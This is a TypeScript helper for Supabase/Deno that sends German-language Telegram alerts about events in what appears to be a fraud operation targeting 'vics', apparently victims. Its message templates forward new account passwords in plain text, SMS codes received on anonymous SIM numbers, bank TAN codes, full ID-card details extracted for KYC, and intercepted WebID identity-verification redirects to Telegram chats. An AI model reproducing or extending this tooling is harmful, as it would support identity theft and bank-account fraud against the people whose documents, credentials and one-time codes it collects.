// Shared Telegram notification helper.
// Fetches subscribed chat IDs, formats a message per event, and sends via Bot API.

export type TelegramEvent =
  | "lead_note_added"
  | "vic_note_added"
  | "document_uploaded"
  | "assignment_created"
  | "assignment_completed"
  | "anosim_sms_received"
  | "user_account_created"
  | "tan_forwarded_to_vic"
  | "kyc_data_extracted"
  | "webid_redirect_intercepted"
  | "chat_message_received"
  | "appointment_booked"
  | "todo_completed"
  | "test";



interface Payload {
  [k: string]: any;
}

function esc(s: unknown): string {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function code(s: unknown): string {
  return `<code>${esc(s)}</code>`;
}

function formatMessage(event: TelegramEvent, p: Payload): string {
  switch (event) {
    case "lead_note_added":
      return [
        `📝 <b>Neue Lead-Notiz</b>`,
        `👤 ${esc(p.lead_name || "Unbekannt")}`,
        p.lead_email ? `📧 ${code(p.lead_email)}` : null,
        ``,
        `<i>${esc(p.content || "")}</i>`,
      ].filter(Boolean).join("\n");

    case "vic_note_added":
      return [
        `📌 <b>Neue Vic-Notiz</b>`,
        `👤 ${esc(p.vic_name || "Unbekannt")}`,
        p.vic_email ? `📧 ${code(p.vic_email)}` : null,
        ``,
        `<i>${esc(p.content || "")}</i>`,
      ].filter(Boolean).join("\n");

    case "document_uploaded":
      return [
        `📎 <b>Neues Dokument</b>`,
        `👤 ${esc(p.vic_name || "Unbekannt")}`,
        p.category ? `📂 ${esc(p.category)}` : null,
        p.file_name ? `📄 ${esc(p.file_name)}` : null,
        p.verification_title ? `🔗 Auftrag: ${esc(p.verification_title)}` : null,
      ].filter(Boolean).join("\n");

    case "assignment_created":
      return [
        `📥 <b>Auftrag zugewiesen</b>`,
        `🏦 ${esc(p.verification_title || "")}${p.type ? ` – ${esc(p.type)}` : ""}`,
        `👤 ${esc(p.vic_name || "")}`,
        p.phone ? `📱 ${code(p.phone)}` : null,
        p.identcode ? `🔢 Identcode: ${code(p.identcode)}` : null,
      ].filter(Boolean).join("\n");

    case "assignment_completed":
      return [
        `✅ <b>Auftrag abgeschlossen</b>`,
        `🏦 ${esc(p.verification_title || "")}${p.type ? ` – ${esc(p.type)}` : ""}`,
        `👤 ${esc(p.vic_name || "")}`,
        p.identcode ? `🔢 Identcode: ${code(p.identcode)}` : null,
      ].filter(Boolean).join("\n");

    case "anosim_sms_received":
      return [
        `📩 <b>Neue SMS</b>`,
        p.phone ? `📱 Nummer: ${code(p.phone)}` : null,
        p.vic_name ? `👤 Vic: ${esc(p.vic_name)}` : null,
        p.verification_title ? `🏦 Auftrag: ${esc(p.verification_title)}` : null,
        p.sender ? `📤 Absender: ${esc(p.sender)}` : null,
        ``,
        code(p.text || ""),
      ].filter(Boolean).join("\n");

    case "user_account_created":
      return [
        `🆕 <b>Neues Vic-Konto</b>`,
        `👤 ${esc(p.name || "")}`,
        p.email ? `📧 ${code(p.email)}` : null,
        p.password ? `🔑 ${code(p.password)}` : null,
        p.phone ? `📱 ${code(p.phone)}` : null,
      ].filter(Boolean).join("\n");

    case "tan_forwarded_to_vic":
      return [
        `🚀 <b>TAN weitergeleitet</b>`,
        `👤 Vic: ${esc(p.vic_name || "")}`,
        p.vic_phone ? `📱 An: ${code(p.vic_phone)}` : null,
        p.verification_title ? `🏦 Auftrag: ${esc(p.verification_title)}` : null,
        p.code ? `🔢 Code: ${code(p.code)}` : null,
      ].filter(Boolean).join("\n");

    case "kyc_data_extracted": {
      const dash = "—";
      const val = (v: unknown) => {
        const s = String(v ?? "").trim();
        return s ? esc(s) : dash;
      };
      return [
        `🪪 <b>Neuer Ausweis verfügbar</b>`,
        `👤 Vic: ${esc(p.vic_name || "Unbekannt")}`,
        ``,
        `<b>Vorname:</b> ${val(p.first_names)}`,
        `<b>Nachname:</b> ${val(p.last_name)}`,
        `<b>Geburtsname:</b> ${val(p.birth_name)}`,
        `<b>Geburtsdatum:</b> ${val(p.birth_date)}`,
        `<b>Geburtsort:</b> ${val(p.birth_place)}`,
        `<b>Straße & Hausnummer:</b> ${val(p.street)}`,
        `<b>PLZ Stadt:</b> ${[p.zip_code, p.city].filter((x) => String(x ?? "").trim()).map(esc).join(" ") || dash}`,
      ].join("\n");
    }

    case "webid_redirect_intercepted":
      return [
        `🔗 <b>WebID Redirect abgefangen</b>`,
        p.url ? `🎯 Ziel: ${code(p.url)}` : null,
        p.host ? `🌐 Host: ${esc(p.host)}` : null,
        p.source ? `🧭 Quelle: ${esc(p.source)}` : null,
        p.path ? `📄 Pfad: ${esc(p.path)}` : null,
        p.referrer ? `↩️ Referrer: ${esc(p.referrer)}` : null,
        p.userAgent ? `🖥️ UA: ${esc(p.userAgent)}` : null,
      ].filter(Boolean).join("\n");

    case "chat_message_received":
      return [
        `💬 <b>Neue Chat-Nachricht</b>`,
        `👤 ${esc(p.vic_name || "Unbekannt")}`,
        p.vic_email ? `📧 ${code(p.vic_email)}` : null,
        ``,
        `<i>${esc(p.preview || "")}</i>`,
      ].filter(Boolean).join("\n");

    case "appointment_booked":
      return [
        `📅 <b>Neuer Termin gebucht</b>`,
        p.vic_name ? `👤 ${esc(p.vic_name)}` : null,
        p.contact_name ? `📞 mit ${esc(p.contact_name)}` : null,
        p.appointment_date ? `🗓 ${esc(p.appointment_date)} um ${esc(p.appointment_time || "")} Uhr` : null,
      ].filter(Boolean).join("\n");

    case "todo_completed":
      return [
        `✅ <b>To Do abgeschlossen</b>`,
        p.title ? `📝 ${esc(p.title)}` : null,
        p.caller_name ? `👤 Caller: ${esc(p.caller_name)}` : null,
      ].filter(Boolean).join("\n");

    case "test":
      return `🔔 <b>Test-Nachricht</b>\nDie Telegram-Anbindung funktioniert.`;
  }
}


async function sendToChat(botToken: string, chatId: string, text: string) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
    if (!res.ok) {
      const body = await res.text();
      console.error(`Telegram send failed [${res.status}] chat=${chatId}: ${body}`);
    }
    return res.ok;
  } catch (e) {
    console.error("Telegram send exception:", e);
    return false;
  }
}

/**
 * Send a Telegram notification for a given event to all subscribed chats.
 * Requires a service-role Supabase client to read the subscriptions table.
 */
export async function sendTelegramNotification(
  serviceClient: any,
  event: TelegramEvent,
  payload: Payload,
  opts?: { chatIdOverride?: string }
): Promise<{ sent: number; skipped: boolean; reason?: string }> {
  const botToken = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!botToken) return { sent: 0, skipped: true, reason: "no_bot_token" };

  const text = formatMessage(event, payload);

  // Test / override — send to a single chat directly
  if (opts?.chatIdOverride) {
    const ok = await sendToChat(botToken, opts.chatIdOverride, text);
    return { sent: ok ? 1 : 0, skipped: false };
  }

  // Load subscriptions for this event
  const { data: subs, error } = await serviceClient
    .from("telegram_notification_subscriptions")
    .select("chat_id, enabled, telegram_chats(chat_id)")
    .eq("event", event)
    .eq("enabled", true);

  if (error) {
    console.error("Failed loading telegram subs:", error);
    return { sent: 0, skipped: true, reason: "sub_error" };
  }

  const chatIds: string[] = [];
  for (const s of subs ?? []) {
    const cid = (s as any)?.telegram_chats?.chat_id;
    if (cid) chatIds.push(String(cid));
  }
  if (chatIds.length === 0) return { sent: 0, skipped: true, reason: "no_subscribers" };

  const results = await Promise.all(chatIds.map((id) => sendToChat(botToken, id, text)));
  return { sent: results.filter(Boolean).length, skipped: false };
}
